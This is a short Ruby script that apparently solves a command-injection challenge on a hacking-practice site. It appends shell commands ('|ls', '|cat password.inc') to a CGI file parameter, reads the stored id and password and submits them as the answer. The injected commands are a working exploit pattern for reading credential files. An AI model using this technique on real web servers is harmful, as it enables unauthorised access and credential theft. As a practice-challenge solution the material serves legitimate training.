# encoding: utf-8
require_relative 'hack_utils'

# this allows to handle pipe symbols in query parameters
URI.class_eval {remove_const :DEFAULT_PARSER } if URI.const_defined? :DEFAULT_PARSER 
URI::DEFAULT_PARSER = URI::Parser.new(:UNRESERVED => URI::REGEXP::PATTERN::UNRESERVED + '|')

def get_and_parse(url)
  puts "url: '#{url}'"
  resp  = RestClient.get url
  doc = Nokogiri::HTML(resp.body)
  return doc.css('body').text.split("\n")[0,2].map{|l| l.strip}
end
BASE_URL = 'http://www.hackerschool.jp/hack/take20/index.pl?file=main.txt'

# get file list
puts get_and_parse(BASE_URL + '|ls')

# get password.inc
ret = get_and_parse(BASE_URL + '|cat%20password.inc')
puts ret
id, pass = ret.map{|l| l.sub(/^(id|password):/,'') }

# post answer
HackUtils.post_answer_with_url(BASE_URL, :id => id, :pass => pass)

